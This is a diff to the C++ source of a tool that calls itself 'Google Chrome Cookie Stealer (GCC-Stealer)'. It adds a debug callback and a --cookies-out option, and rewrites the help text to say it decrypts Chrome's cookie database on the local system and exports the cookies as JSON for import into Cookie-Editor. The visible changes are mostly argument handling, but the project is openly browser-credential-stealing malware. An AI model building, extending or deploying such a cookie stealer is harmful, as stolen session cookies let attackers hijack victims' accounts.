@@ -403,12 +403,17 @@ void decrypt_cookies(cookie_vector_t* cookie_vector)
     } 
 }
 
+int cbSelect(void* data, int ncols, char** values, char** headers)
+{
+    std::cout << ncols << " " << values << std::endl;
+    return 0;
+}
 
 void argsHandling(int argc, char** argv) {
     programArgs = argparse::ArgumentParser("GCC-stealer.exe", GCC_STEALER_VERSION);
 
-    programArgs.add_description("GCC");
-    programArgs.add_epilog("GCC);
+    programArgs.add_description("Google Chrome Cookie Stealer (GCC-Stealer)");
+    programArgs.add_epilog("It must be run on the same system you want to decrypt the cookies from");
 
     programArgs.add_argument("--json-print")
         .help("print a JSON structure with the decrypted cookies you can import in Cookie-Editor")
@@ -418,6 +423,10 @@ void argsHandling(int argc, char** argv) {
     programArgs.add_argument("--json-file")
         .help("create a JSON file with the decrypted cookies you can import in Cookie-Editor")
         .default_value(std::string{ "cookies.json" });
+
+    programArgs.add_argument("--cookies-out")
+        .help("path where to write decrypted cookies DB to")
+        .default_value(std::string{ "Cookies_decrypted" });
 
     programArgs.add_argument("--cookies-path")
         .help("tell GCC-Stealer where to look for the cookies DB");
